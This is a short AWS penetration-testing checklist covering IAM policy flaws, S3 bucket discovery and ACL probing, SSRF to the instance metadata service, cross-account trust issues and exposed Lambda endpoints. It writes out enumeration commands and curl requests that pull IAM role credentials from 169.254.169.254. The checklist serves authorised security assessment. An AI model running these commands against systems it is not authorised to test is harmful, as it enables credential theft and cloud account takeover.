# AWS Checklist

## IAM

- Overly permissive role policies (`"Action": "*"`, `"Resource": "*"`).
- `sts:AssumeRole` with `"Principal": {"AWS": "*"}` → cross-account takeover.
- Unused access keys (90+ days) — `aws iam list-access-keys`.
- Inline policies hiding `iam:PassRole` grants.

```bash
# Enumerate after creds leak
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <u>
aws iam list-roles
aws-vault list
```

Tools: [cloudsplaining](https://github.com/salesforce/cloudsplaining), [pacu](https://github.com/RhinoSecurityLabs/pacu), [principalmapper](https://github.com/nccgroup/PMapper).

## S3

Discovery:
```bash
# Subdomain enum surfaces S3 via CNAME
dig target.s3.amazonaws.com

# Bucket brute — don't hammer, respect rate
s3scanner scan -b target-backup
bucketlister target-backup

# Permissions probe
aws s3 ls s3://target-backup --no-sign-request
aws s3api get-bucket-acl --bucket target-backup --no-sign-request
aws s3api get-bucket-policy --bucket target-backup --no-sign-request
```

Findings:
- Public `READ` → info disclosure.
- Public `WRITE` → defacement, malware hosting.
- Public `READ_ACP`/`WRITE_ACP` → privilege escalation to full control.
- Bucket policy wildcard principals.

## SSRF → IMDS

IMDSv1 (legacy):
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

IMDSv2 (session token required):
```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Report as high when:
- SSRF reaches metadata
- Returns creds (`AccessKeyId`, `SecretAccessKey`, `Token`)
- Creds valid (`aws sts get-caller-identity` confirms)

## STS / role confusion

- Confused deputy — external ID missing in cross-account roles.
- SAML/OIDC trust policy too wide (`token.actions.githubusercontent.com:*`).

## Lambda / API Gateway

- Function URL with `AuthType: NONE` → pre-auth endpoint.
- API Gateway resource policy wide-open.
- Env vars with secrets (`aws lambda get-function-configuration`).

## References

- hackingthe.cloud — https://hackingthe.cloud
- flaws.cloud / flaws2.cloud — CTF-style labs
- AWS Customer Playbook — https://github.com/aws-samples/aws-customer-playbook-framework
